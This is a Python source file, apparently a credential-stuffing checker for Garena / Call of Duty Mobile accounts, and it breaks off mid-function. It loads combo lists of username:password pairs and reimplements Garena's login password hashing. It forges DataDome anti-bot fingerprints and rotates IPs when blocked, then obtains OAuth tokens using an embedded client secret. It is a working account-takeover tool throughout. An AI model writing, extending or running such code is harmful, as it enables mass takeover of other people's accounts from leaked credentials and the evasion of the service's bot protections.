import hashlib
import json
import logging
import os
import random
import re
import sys
import threading
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path

import cloudscraper
import colorama
import requests
from Crypto.Cipher import AES
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.text import Text
from rich import box
from rich.align import Align
from rich.prompt import Prompt
from rich.columns import Columns

colorama.init(autoreset=True)
console = Console()

COLOR_BORDER = "#D4C4A8"
COLOR_TITLE = "#C6A43F"
COLOR_ACCENT = "#A68A56"
COLOR_TEXT = "#F5EBD9"
COLOR_DIM = "#8B7A5B"

CODM_REGIONS = {
    'PH': {'name': 'Philippines', 'code': '63', 'flag': '🇵🇭'},
    'ID': {'name': 'Indonesia', 'code': '62', 'flag': '🇮🇩'},
    'HK': {'name': 'Hong Kong', 'code': '852', 'flag': '🇭🇰'},
    'MY': {'name': 'Malaysia', 'code': '60', 'flag': '🇲🇾'},
    'TW': {'name': 'Taiwan', 'code': '886', 'flag': '🇹🇼'},
    'TH': {'name': 'Thailand', 'code': '66', 'flag': '🇹🇭'},
    'SG': {'name': 'Singapore', 'code': '65', 'flag': '🇸🇬'},
    'VN': {'name': 'Vietnam', 'code': '84', 'flag': '🇻🇳'},
    'MM': {'name': 'Myanmar', 'code': '95', 'flag': '🇲🇲'},
    'KH': {'name': 'Cambodia', 'code': '855', 'flag': '🇰🇭'},
    'LA': {'name': 'Laos', 'code': '856', 'flag': '🇱🇦'},
    'BN': {'name': 'Brunei', 'code': '673', 'flag': '🇧🇳'},
}

IP_COUNTRY_PREFIXES = {
    'PH': [
        '43.', '49.', '58.', '61.', '98.', '112.', '119.', '120.', '122.', '124.', '125.',
        '180.', '202.', '203.', '210.', '222.', '223.', '27.', '36.', '110.', '1.', '14.',
        '42.', '101.', '103.', '113.', '115.', '118.', '175.', '211.', '218.', '219.'
    ],
    'ID': [
        '36.', '39.', '42.', '43.', '103.', '110.', '111.', '112.', '114.', '118.', '120.',
        '125.', '139.', '140.', '180.', '182.', '202.', '210.', '222.', '223.', '1.', '14.',
        '27.', '49.', '58.', '61.', '101.', '113.', '115.', '124.', '211.', '218.'
    ],
    'HK': [
        '42.', '43.', '49.', '58.', '61.', '103.', '112.', '113.', '116.', '119.', '123.',
        '124.', '168.', '202.', '203.', '210.', '213.', '218.', '219.', '221.', '1.', '14.',
        '27.', '36.', '101.', '110.', '115.', '118.', '175.', '193.', '211.', '223.'
    ],
    'MY': [
        '1.', '14.', '27.', '42.', '43.', '58.', '60.', '61.', '103.', '110.', '113.', '115.',
        '124.', '175.', '202.', '210.', '211.', '218.', '219.', '223.', '36.', '49.', '101.',
        '112.', '118.', '119.', '120.', '122.', '203.', '222.'
    ],
    'TW': [
        '1.', '27.', '36.', '42.', '49.', '60.', '61.', '101.', '103.', '114.', '118.', '120.',
        '124.', '175.', '203.', '210.', '211.', '218.', '219.', '223.', '14.', '43.', '58.',
        '110.', '112.', '113.', '115.', '116.', '202.', '222.'
    ],
    'TH': [
        '1.', '14.', '27.', '36.', '42.', '43.', '49.', '58.', '61.', '101.', '103.', '110.',
        '113.', '118.', '124.', '202.', '210.', '211.', '218.', '223.', '60.', '112.', '115.',
        '116.', '119.', '120.', '122.', '175.', '203.', '222.'
    ],
    'SG': [
        '1.', '27.', '36.', '42.', '43.', '47.', '49.', '58.', '103.', '112.', '113.', '116.',
        '118.', '124.', '128.', '202.', '203.', '210.', '211.', '218.', '14.', '61.', '101.',
        '110.', '115.', '119.', '120.', '122.', '175.', '222.'
    ],
    'VN': [
        '1.', '14.', '27.', '36.', '42.', '43.', '49.', '58.', '61.', '103.', '113.', '115.',
        '118.', '123.', '124.', '202.', '210.', '211.', '218.', '223.', '60.', '101.', '110.',
        '112.', '116.', '119.', '120.', '122.', '175.', '203.'
    ],
    'MM': [
        '1.', '14.', '36.', '42.', '43.', '49.', '58.', '61.', '103.', '110.', '113.', '118.',
        '123.', '124.', '202.', '210.', '211.', '218.', '219.', '223.', '27.', '60.', '101.',
        '112.', '115.', '116.', '119.', '120.', '122.', '203.'
    ],
    'KH': [
        '1.', '14.', '27.', '36.', '42.', '43.', '49.', '58.', '61.', '103.', '113.', '115.',
        '118.', '124.', '175.', '202.', '210.', '211.', '218.', '223.', '60.', '101.', '110.',
        '112.', '116.', '119.', '120.', '122.', '203.', '222.'
    ],
    'LA': [
        '1.', '14.', '27.', '36.', '42.', '43.', '49.', '58.', '61.', '103.', '110.', '113.',
        '118.', '124.', '202.', '210.', '211.', '218.', '219.', '223.', '60.', '101.', '112.',
        '115.', '116.', '119.', '120.', '122.', '175.', '203.'
    ],
    'BN': [
        '1.', '36.', '42.', '43.', '49.', '58.', '61.', '103.', '110.', '112.', '119.', '124.',
        '202.', '210.', '211.', '218.', '219.', '220.', '222.', '223.', '14.', '27.', '60.',
        '101.', '113.', '115.', '116.', '118.', '120.', '203.'
    ],
}

def ip_to_country(ip):
    if not ip or ip == 'N/A':
        return None, None
    for code, prefixes in IP_COUNTRY_PREFIXES.items():
        for prefix in prefixes:
            if ip.startswith(prefix):
                region = CODM_REGIONS.get(code)
                if region:
                    return region['name'], region['flag']
    return None, None

RESET = '\033[0m'
SOFT_BEIGE = '\033[38;2;210;180;140m'
SOFT_CYAN = '\033[96m'
SOFT_GREEN = '\033[92m'
SOFT_RED = '\033[91m'
SOFT_YELLOW = '\033[93m'
DIM = '\033[90m'
WHITE = '\033[97m'

def sanitize_string(text):
    if not text or text == 'N/A':
        return text
    try:
        return text.encode('ascii', errors='ignore').decode('ascii')
    except:
        return re.sub(r'[^\x00-\x7F]+', '', str(text))

def clean_account_line(line):
    if not line:
        return None, None
    line = line.strip().lstrip('\ufeff\ufffe')
    line = ''.join(char for char in line if char.isprintable() or char == ':')
    if ':' not in line:
        return None, None
    try:
        parts = line.split(':', 1)
        if len(parts) != 2:
            return None, None
        account = parts[0].strip()
        password = parts[1].strip()
        account = sanitize_string(account)
        password = sanitize_string(password)
        if not account or not password:
            return None, None
        return account, password
    except:
        return None, None

def format_codm_region(region_code):
    if not region_code or region_code == 'N/A':
        return 'N/A'
    region_code = region_code.upper()
    region_info = CODM_REGIONS.get(region_code)
    if region_info:
        return f"{region_info['flag']} {region_info['name']} ({region_code})"
    else:
        return f"{region_code}"

def format_mobile_number(mobile_no, country_code=None):
    if not mobile_no or mobile_no == 'N/A' or not str(mobile_no).strip():
        return 'N/A'
    mobile_str = str(mobile_no).strip()
    mobile_str = mobile_str.replace('+', '').replace(' ', '').replace('-', '')
    if country_code:
        country_code = str(country_code).strip()
        if not mobile_str.startswith(country_code):
            if mobile_str.startswith('0'):
                mobile_str = country_code + mobile_str[1:]
            else:
                mobile_str = country_code + mobile_str
    detected_country_code = None
    for code_key, region_info in CODM_REGIONS.items():
        code = region_info['code']
        if mobile_str.startswith(code):
            detected_country_code = code
            break
    if detected_country_code:
        local_number = mobile_str[len(detected_country_code):]
        if len(local_number) >= 4:
            masked = '*' * (len(local_number) - 4) + local_number[-4:]
            return f"+{detected_country_code} {masked}"
        else:
            return f"+{detected_country_code} {local_number}"
    else:
        if len(mobile_str) >= 4:
            masked = '*' * (len(mobile_str) - 4) + mobile_str[-4:]
            return f"+{masked}"
        else:
            return mobile_str

class ColoredFormatter(logging.Formatter):
    COLORS = {
        'DEBUG': colorama.Fore.BLUE,
        'INFO': colorama.Fore.GREEN,
        'WARNING': colorama.Fore.YELLOW,
        'ERROR': colorama.Fore.RED,
        'CRITICAL': colorama.Fore.RED + colorama.Back.WHITE,
    }
    RESET = colorama.Style.RESET_ALL
    def format(self, record):
        levelname = record.levelname
        if levelname in self.COLORS:
            record.msg = f"{self.COLORS[levelname]}{record.msg}{self.RESET}"
        return super().format(record)

logger = logging.getLogger()
handler = logging.StreamHandler()
handler.setFormatter(ColoredFormatter())
logger.addHandler(handler)
logger.setLevel(logging.INFO)
logging.getLogger("urllib3").setLevel(logging.ERROR)
logging.getLogger("requests").setLevel(logging.ERROR)

class AccountFileManager:
    def __init__(self, combo_folder="Combo"):
        self.combo_folder = Path(combo_folder)
        self.combo_folder.mkdir(exist_ok=True)
        self._file_lock = threading.Lock()
    def scan_combo_folder(self):
        return list(self.combo_folder.glob("*.txt"))
    def get_file_info(self, file_path):
        file_path = Path(file_path)
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = [line.strip() for line in f if line.strip() and ':' in line]
                account_count = len(lines)
            file_size = file_path.stat().st_size
            return {
                'name': file_path.name,
                'path': str(file_path),
                'size': file_size,
                'size_str': self._format_size(file_size),
                'account_count': account_count
            }
        except Exception:
            return None
    def _format_size(self, size_bytes):
        for unit in ['B', 'KB', 'MB', 'GB']:
            if size_bytes < 1024.0:
                return f"{size_bytes:.2f} {unit}"
            size_bytes /= 1024.0
        return f"{size_bytes:.2f} TB"
    def clean_file_encoding(self, file_path):
        file_path = Path(file_path)
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()
            cleaned_lines = []
            invalid_count = 0
            for line in lines:
                account, password = clean_account_line(line)
                if account and password:
                    cleaned_lines.append(f"{account}:{password}\n")
                else:
                    invalid_count += 1
            with open(file_path, 'w', encoding='utf-8') as f:
                f.writelines(cleaned_lines)
            return len(cleaned_lines), invalid_count
        except Exception:
            return 0, 0
    def clean_duplicates(self, file_path, overwrite=True):
        file_path = Path(file_path)
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = [line.strip() for line in f if line.strip()]
            original_count = len(lines)
            unique_lines = list(dict.fromkeys(lines))
            duplicates_removed = original_count - len(unique_lines)
            if overwrite:
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write('\n'.join(unique_lines))
            else:
                new_path = file_path.parent / f"{file_path.stem}_cleaned.txt"
                with open(new_path, 'w', encoding='utf-8') as f:
                    f.write('\n'.join(unique_lines))
            return duplicates_removed
        except Exception:
            return 0
    def remove_line_from_file(self, file_path, line_to_remove):
        try:
            file_path = Path(file_path)
            target = line_to_remove.strip()
            with self._file_lock:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    lines = f.readlines()
                with open(file_path, 'w', encoding='utf-8') as f:
                    for line in lines:
                        if line.strip() != target:
                            f.write(line)
            return True
        except Exception:
            return False

def _db_fetch_cookies():
    return []
def _db_ban_cookie(cookie_line):
    pass
COOKIE_SOURCE = "file"
SERVER_COOKIE_URL = "https://raw.githubusercontent.com/lessiee/cookie/refs/heads/main/fresh_cookie.txt"
_SCRIPT_DIR_COOKIE = os.path.dirname(os.path.abspath(__file__))
COOKIE_FILE = os.path.join(_SCRIPT_DIR_COOKIE, 'fresh_cookie.txt')

def prompt_cookie_source():
    global COOKIE_SOURCE
    COOKIE_SOURCE = "file"
    for fname in ("fresh_cookie.txt", "fresh_cookies.txt"):
        if os.path.exists(fname):
            console.print(Align.center(Panel(f"Cookie file found: {fname}", border_style=COLOR_BORDER, box=box.HEAVY, width=70)))
            return
    console.print(Align.center(Panel("No cookie file found in current directory. Place fresh_cookie.txt alongside codm.py and re-run.", border_style=COLOR_BORDER, box=box.HEAVY, width=70)))

class CookieManager:
    def __init__(self, server_url=None):
        self.banned_cookies = set()
        self.server_url = server_url
        self.banned_cookie_file = 'banned_cookies.txt'
        self._lock = threading.Lock()
        self.load_banned_cookies()
    def load_banned_cookies(self):
        if os.path.exists(self.banned_cookie_file):
            with open(self.banned_cookie_file, 'r') as f:
                self.banned_cookies = set(line.strip() for line in f if line.strip())
    def is_banned(self, cookie):
        return cookie in self.banned_cookies
    def mark_banned(self, cookie):
        with self._lock:
            self.banned_cookies.add(cookie)
            with open(self.banned_cookie_file, 'a') as f:
                f.write(cookie + '\n')
            _db_ban_cookie(cookie)
    def get_valid_cookies(self):
        valid = []
        if COOKIE_SOURCE in ("file", "both"):
            for fname in (COOKIE_FILE, 'fresh_cookies.txt'):
                if os.path.exists(fname):
                    with open(fname, 'r', encoding='utf-8', errors='ignore') as f:
                        file_cookies = [c.strip() for c in f.read().splitlines() if c.strip() and 'datadome=' in c.strip() and not self.is_banned(c.strip())]
                    valid.extend(file_cookies)
                    break
        if COOKIE_SOURCE in ("db", "both"):
            db_cookies = _db_fetch_cookies()
            seen = set(valid)
            for c in db_cookies:
                if c not in seen and not self.is_banned(c):
                    valid.append(c)
                    seen.add(c)
        random.shuffle(valid)
        return valid
    def get_valid_cookie(self):
        cookies = self.get_valid_cookies()
        return random.choice(cookies) if cookies else None
    def save_cookie(self, datadome_value):
        formatted = f"datadome={datadome_value.strip()}"
        if not self.is_banned(formatted):
            existing = set()
            if os.path.exists(COOKIE_FILE):
                with open(COOKIE_FILE, 'r') as f:
                    existing = set(line.strip() for line in f if line.strip())
            if formatted not in existing:
                with open(COOKIE_FILE, 'a') as f:
                    f.write(formatted + '\n')
                return True
        return False
    def refresh_cache(self):
        return []

class DataDomeManager:
    def __init__(self):
        self.current_datadome = None
        self.datadome_history = []
        self._403_attempts = 0
    def set_datadome(self, datadome_cookie):
        if datadome_cookie and datadome_cookie != self.current_datadome:
            self.current_datadome = datadome_cookie
            self.datadome_history.append(datadome_cookie)
            if len(self.datadome_history) > 10:
                self.datadome_history.pop(0)
    def get_datadome(self):
        return self.current_datadome
    def extract_datadome_from_session(self, session):
        try:
            cookies_dict = session.cookies.get_dict()
            datadome_cookie = cookies_dict.get('datadome')
            if datadome_cookie:
                self.set_datadome(datadome_cookie)
                return datadome_cookie
            return None
        except Exception:
            return None
    def clear_session_datadome(self, session):
        try:
            if 'datadome' in session.cookies:
                del session.cookies['datadome']
        except Exception:
            pass
    def set_session_datadome(self, session, datadome_cookie=None):
        try:
            self.clear_session_datadome(session)
            cookie_to_use = datadome_cookie or self.current_datadome
            if cookie_to_use:
                session.cookies.set('datadome', cookie_to_use, domain='.garena.com')
                return True
            return False
        except Exception:
            return False
    def get_current_ip(self):
        ip_services = ['https://api.ipify.org', 'https://icanhazip.com', 'https://ident.me', 'https://checkip.amazonaws.com']
        for service in ip_services:
            try:
                response = requests.get(service, timeout=8)
                if response.status_code == 200:
                    ip = response.text.strip()
                    if ip and '.' in ip:
                        return ip
            except Exception:
                continue
        return None
    def wait_for_ip_change(self, session, check_interval=5, max_wait_time=600):
        original_ip = self.get_current_ip()
        if not original_ip:
            console.print("  [yellow]⚠️  Could not determine current IP, waiting 10 seconds[/yellow]")
            time.sleep(10)
            return True
        start_time = time.time()
        while time.time() - start_time < max_wait_time:
            time.sleep(check_interval)
            current_ip = self.get_current_ip()
            if current_ip and current_ip != original_ip:
                return True
        return False
    def handle_403(self, session):
        self._403_attempts += 1
        if self._403_attempts >= 3:
            if self.wait_for_ip_change(session):
                self._403_attempts = 0
                new_datadome = get_datadome_cookie(session)
                if new_datadome:
                    self.set_datadome(new_datadome)
                    return True
                else:
                    return False
            else:
                return False
        return False

def get_datadome_cookie(session=None):
    url = 'https://dd.garena.com/js/'
    headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://account.garena.com',
        'pragma': 'no-cache',
        'referer': 'https://account.garena.com/',
        'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
    }
    payload = {
        'jsData': json.dumps({
            "ttst": 76.70000004768372, "ifov": False, "hc": 4, "br_oh": 824, "br_ow": 1536,
            "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
            "wbd": False, "dp0": True, "tagpu": 5.738121195951787, "wdif": False, "wdifrm": False,
            "npmtm": False, "br_h": 738, "br_w": 260, "isf": False, "nddc": 1, "rs_h": 864,
            "rs_w": 1536, "rs_cd": 24, "phe": False, "nm": False, "jsf": False, "lg": "en-US",
            "pr ": 1.25, "ars_h": 824, "ars_w": 1536, "tz": -480, "str_ss": True, "str_ls": True,
            "str_idb": True, "str_odb": False, "plgod": False, "plg": 5, "plgne": True, "plgre": True,
            "plgof": False, "plggt": False, "pltod": False, "hcovdr": False, "hcovdr2": False,
            "plovdr": False, "plovdr2": False, "ftsovdr": False, "ftsovdr2": False, "lb": False,
            "eva": 33, "lo": False, "ts_mtp": 0, "ts_tec": False, "ts_tsa": False, "vnd": "Google Inc.",
            "bid": "NA", "mmt": "application/pdf,text/pdf", "plu": "PDF Viewer,Chrome PDF Viewer,Chromium PDF Viewer,Microsoft Edge PDF Viewer,WebKit built-in PDF",
            "hdn": False, "awe": False, "geb": False, "dat": False, "med": "defined", "aco": "probably",
            "acots": False, "acmp": "probably", "acmpts": True, "acw": "probably", "acwts": False,
            "acma": "maybe", "acmats": False, "ac3": "", "ac3ts": False, "acf": "probably", "acfts": False,
            "acmp4": "maybe", "acmp4ts": False, "acmp3": "probably", "acmp3ts": False, "acwm": "maybe",
            "acwmts": False, "ocpt": False, "vco": "", "vcots": False, "vch": "probably", "vchts": True,
            "vcw": "probably", "vcwts": True, "vc3": "maybe", "vc3ts": False, "vcmp": "", "vcmpts": False,
            "vcq": "maybe", "vcqts": False, "vc1": "probably", "vc1ts": True, "dvm": 8, "sqt": False,
            "so": "landscape-primary", "bda": False, "wdw": True, "prm": True, "tzp": True, "cvs": True,
            "usb": True, "cap": True, "tbf": False, "lgs": True, "tpd": True
        }),
        'eventCounters': '[]',
        'jsType': 'ch',
        'cid': 'KOWn3t9QNk3dJJJEkpZJpspfb2HPZIVs0KSR7RYTscx5iO7o84cw95j40zFFG7mpfbKxmfhAOs~bM8Lr8cHia2JZ3Cq2LAn5k6XAKkONfSSad99Wu36EhKYyODGCZwae',
        'ddk': 'AE3F04AD3F0D3A462481A337485081',
        'Referer': 'https://account.garena.com/',
        'request': '/',
        'responsePage': 'origin',
        'ddv': '4.35.4'
    }
    data = '&'.join(f'{k}={urllib.parse.quote(str(v))}' for k, v in payload.items())
    retries = 3
    _use_own_scraper = session is None
    for attempt in range(retries):
        try:
            if _use_own_scraper:
                scraper = cloudscraper.create_scraper()
            else:
                scraper = session
            response = scraper.post(url, headers=headers, data=data)
            response.raise_for_status()
            try:
                response_json = response.json()
            except json.JSONDecodeError:
                if attempt < retries - 1:
                    time.sleep(1)
                    continue
                return None
            if response_json.get('status') == 200 and 'cookie' in response_json:
                cookie_string = response_json['cookie']
                if '=' in cookie_string and ';' in cookie_string:
                    datadome = cookie_string.split(';')[0].split('=')[1]
                else:
                    datadome = cookie_string
                return datadome
            else:
                if attempt < retries - 1:
                    time.sleep(1)
                    continue
        except:
            if attempt < retries - 1:
                time.sleep(1)
    return None

def encode(plaintext, key):
    key = bytes.fromhex(key)
    plaintext = bytes.fromhex(plaintext)
    cipher = AES.new(key, AES.MODE_ECB)
    ciphertext = cipher.encrypt(plaintext)
    return ciphertext.hex()[:32]

def get_passmd5(password):
    decoded_password = urllib.parse.unquote(password)
    return hashlib.md5(decoded_password.encode('utf-8')).hexdigest()

def hash_password(password, v1, v2):
    passmd5 = get_passmd5(password)
    inner_hash = hashlib.sha256((passmd5 + v1).encode()).hexdigest()
    outer_hash = hashlib.sha256((inner_hash + v2).encode()).hexdigest()
    return encode(passmd5, outer_hash)

def applyck(session, cookie_str):
    session.cookies.clear()
    cookie_dict = {}
    for item in cookie_str.split(";"):
        item = item.strip()
        if not item:
            continue
        if "=" in item:
            try:
                key, value = item.split("=", 1)
                cookie_dict[key.strip()] = value.strip()
            except ValueError:
                pass
    session.cookies.update(cookie_dict)

def prelogin(session, account, datadome_manager, max_retries=3):
    url = 'https://sso.garena.com/api/prelogin'
    retry_403 = 0
    retry_general = 0
    retry_total = 0
    MAX_TOTAL = 5
    while retry_total < MAX_TOTAL:
        retry_total += 1
        try:
            params = {
                'app_id': '10100',
                'account': account,
                'format': 'json',
                'id': str(int(time.time() * 1000))
            }
            current_cookies = session.cookies.get_dict()
            cookie_parts = []
            for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
                if cookie_name in current_cookies:
                    cookie_parts.append(f"{cookie_name}={current_cookies[cookie_name]}")
            cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
            headers = {
                'accept': 'application/json, text/plain, */*',
                'accept-encoding': 'gzip, deflate, br, zstd',
                'accept-language': 'en-US,en;q=0.9',
                'connection': 'keep-alive',
                'host': 'sso.garena.com',
                'referer': f'https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-SG&account={account}',
                'sec-ch-ua': '"Google Chrome";v="133", "Chromium";v="133", "Not=A?Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'
            }
            if cookie_header:
                headers['cookie'] = cookie_header
            response = session.get(url, headers=headers, params=params, timeout=12)
            new_cookies = {}
            if 'set-cookie' in response.headers:
                set_cookie_header = response.headers['set-cookie']
                for cookie_str in set_cookie_header.split(','):
                    if '=' in cookie_str:
                        try:
                            cookie_name = cookie_str.split('=')[0].strip()
                            cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
                            if cookie_name and cookie_value:
                                new_cookies[cookie_name] = cookie_value
                        except Exception:
                            pass
            try:
                response_cookies = response.cookies.get_dict()
                for cookie_name, cookie_value in response_cookies.items():
                    if cookie_name not in new_cookies:
                        new_cookies[cookie_name] = cookie_value
            except Exception:
                pass
            for cookie_name, cookie_value in new_cookies.items():
                if cookie_name in ['datadome', 'apple_state_key', 'sso_key']:
                    session.cookies.set(cookie_name, cookie_value, domain='.garena.com')
                    if cookie_name == 'datadome':
                        datadome_manager.set_datadome(cookie_value)
            new_datadome = new_cookies.get('datadome')
            if response.status_code == 403:
                retry_403 += 1
                if new_cookies and retry_403 <= 1:
                    continue
                elif retry_403 <= 2:
                    fresh_datadome = get_datadome_cookie(session)
                    if fresh_datadome:
                        datadome_manager.set_datadome(fresh_datadome)
                        datadome_manager.set_session_datadome(session, fresh_datadome)
                        time.sleep(0.5)
                        continue
                    else:
                        time.sleep(0.5)
                        continue
                else:
                    if datadome_manager.wait_for_ip_change(session):
                        fresh_datadome = get_datadome_cookie(session)
                        if fresh_datadome:
                            datadome_manager.set_datadome(fresh_datadome)
                            datadome_manager.set_session_datadome(session, fresh_datadome)
                            retry_403 = 0
                            datadome_manager._403_attempts = 0
                            time.sleep(0.5)
                            continue
                        else:
                            time.sleep(0.5)
                            continue
                    else:
                        time.sleep(0.5)
                        continue
            response.raise_for_status()
            try:
                data = response.json()
            except json.JSONDecodeError:
                retry_general += 1
                if retry_general < 3:
                    console.print(f"[yellow]⚠️  Invalid JSON response, retrying... ({retry_general}/3)[/yellow]")
                    time.sleep(2)
                    continue
                else:
                    console.print(f"[red]❌ Invalid response after 3 attempts[/red]")
                    return None, None, new_datadome
            if 'error' in data:
                return None, None, new_datadome
            v1 = data.get('v1')
            v2 = data.get('v2')
            if not v1 or not v2:
                return None, None, new_datadome
            return v1, v2, new_datadome
        except requests.exceptions.ConnectionError:
            console.print(f"[yellow]⚠️  Connection error, retrying in 5s...[/yellow]")
            time.sleep(5)
            continue
        except requests.exceptions.Timeout:
            console.print(f"[yellow]⚠️  Timeout error, retrying in 5s...[/yellow]")
            time.sleep(5)
            continue
        except Exception:
            time.sleep(0.5)
            continue
    return None, None, None

def login(session, account, password, v1, v2, max_retries=2):
    hashed_password = hash_password(password, v1, v2)
    url = 'https://sso.garena.com/api/login'
    for retry in range(max_retries):
        try:
            params = {
                'app_id': '10100',
                'account': account,
                'password': hashed_password,
                'redirect_uri': 'https://account.garena.com/',
                'format': 'json',
                'id': str(int(time.time() * 1000))
            }
            current_cookies = session.cookies.get_dict()
            cookie_parts = []
            for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
                if cookie_name in current_cookies:
                    cookie_parts.append(f"{cookie_name}={current_cookies[cookie_name]}")
            cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
            headers = {
                'accept': 'application/json, text/plain, */*',
                'referer': 'https://account.garena.com/',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'
            }
            if cookie_header:
                headers['cookie'] = cookie_header
            response = session.get(url, headers=headers, params=params, timeout=12)
            response.raise_for_status()
            login_cookies = {}
            if 'set-cookie' in response.headers:
                set_cookie_header = response.headers['set-cookie']
                for cookie_str in set_cookie_header.split(','):
                    if '=' in cookie_str:
                        try:
                            cookie_name = cookie_str.split('=')[0].strip()
                            cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
                            if cookie_name and cookie_value:
                                login_cookies[cookie_name] = cookie_value
                        except Exception:
                            pass
            try:
                response_cookies = response.cookies.get_dict()
                for cookie_name, cookie_value in response_cookies.items():
                    if cookie_name not in login_cookies:
                        login_cookies[cookie_name] = cookie_value
            except Exception:
                pass
            for cookie_name, cookie_value in login_cookies.items():
                if cookie_name in ['sso_key', 'apple_state_key', 'datadome']:
                    session.cookies.set(cookie_name, cookie_value, domain='.garena.com')
            try:
                data = response.json()
            except json.JSONDecodeError:
                if retry < max_retries - 1:
                    time.sleep(0.5)
                    continue
                return None
            sso_key = login_cookies.get('sso_key') or response.cookies.get('sso_key')
            if 'error' in data:
                error_msg = data['error']
                if error_msg == 'ACCOUNT DOESNT EXIST':
                    return None
                elif 'captcha' in error_msg.lower():
                    time.sleep(0.5)
                    continue
            return sso_key
        except requests.exceptions.ConnectionError:
            if retry < max_retries - 1:
                console.print(f"[yellow]⚠️  Connection error during login, retrying... ({retry + 1}/{max_retries})[/yellow]")
                time.sleep(0.5)
                continue
            raise
        except requests.exceptions.Timeout:
            if retry < max_retries - 1:
                console.print(f"[yellow]⚠️  Timeout during login, retrying... ({retry + 1}/{max_retries})[/yellow]")
                time.sleep(0.5)
                continue
        except:
            if retry < max_retries - 1:
                time.sleep(0.5)
                continue
    return None

def _generate_device_id():
    import uuid
    return f"02-{uuid.uuid4()}"

OAUTH_MAX_RETRIES = 3
OAUTH_RETRY_DELAY = 2

def get_codm_grant_code(session):
    for attempt in range(OAUTH_MAX_RETRIES):
        try:
            random_id = str(int(time.time() * 1000))
            grant_url = "https://100082.connect.garena.com/oauth/token/grant"
            current_cookies = session.cookies.get_dict()
            cookie_parts = []
            for name in ['apple_state_key', 'fb_state', 'google_state', 'huawei_state', 'line_state', 'twitter_state', 'vk_state', 'tiktok_state', 'youtube_state', 'sso_key', 'datadome']:
                if name in current_cookies:
                    cookie_parts.append(f"{name}={current_cookies[name]}")
            cookie_header = '; '.join(cookie_parts)
            grant_headers = {
                "Host": "100082.connect.garena.com",
                "Connection": "keep-alive",
                "Accept": "application/json, text/plain, */*",
                "User-Agent": "Mozilla/5.0 (Linux; Android 9; Pixel 4 Build/PQ3A.190801.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36; GarenaMSDK/5.12.1(Pixel 4 ;Android 9;en;us;)",
                "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
                "Origin": "https://100082.connect.garena.com",
                "X-Requested-With": "com.garena.game.codm",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://100082.connect.garena.com/universal/oauth?client_id=100082&locale=en-US&create_grant=true&login_scenario=normal&redirect_uri=gop100082://auth/&response_type=code",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-US,en;q=0.9",
            }
            if cookie_header:
                grant_headers["Cookie"] = cookie_header
            grant_body = (f"client_id=100082&response_type=code&redirect_uri=gop100082%3A%2F%2Fauth%2F&create_grant=true&login_scenario=normal&format=json&id={random_id}")
            resp = session.post(grant_url, headers=grant_headers, data=grant_body, timeout=12)
            resp.raise_for_status()
            data = resp.json()
            code = data.get("code", "")
            if not code:
                logger.error(f"[ERROR] token/grant returned no code: {data}")
            return code
        except Exception as e:
            if attempt < OAUTH_MAX_RETRIES - 1:
                delay = OAUTH_RETRY_DELAY * (2 ** attempt)
                time.sleep(delay)
                continue
            else:
                logger.error(f"[ERROR] Error in get_codm_grant_code after {OAUTH_MAX_RETRIES} attempts")
                raise
    return ""

def token_exchange(code, device_id=None, proxies=None):
    if not device_id:
        device_id = _generate_device_id()
    if proxies is None:
        proxies = None
    CLIENT_ID = "100082"
    CLIENT_SECRET = "388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415"
    REDIRECT_URI = "gop100082://auth/"
    exchange_url = "https://100082.connect.garena.com/oauth/token/exchange"
    exchange_headers = {
        "User-Agent": "GarenaMSDK/5.12.1(Pixel 4 ;Android 9;en;us;)",
        "Content-Type": "application/x-www-form-urlencoded",
        "Host": "100082.connect.garena.com",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
    }
    exchange_body = (f"grant_type=authorization_code&code={code}&device_id={urllib.parse.quote(device_id)}&redirect_uri={urllib.parse.quote(REDIRECT_URI)}&source=2&client_id={CLIENT_ID}&client_secret={CLIENT_SECRET}")
    for attempt in range(OAUTH_MAX_RETRIES):
        try:
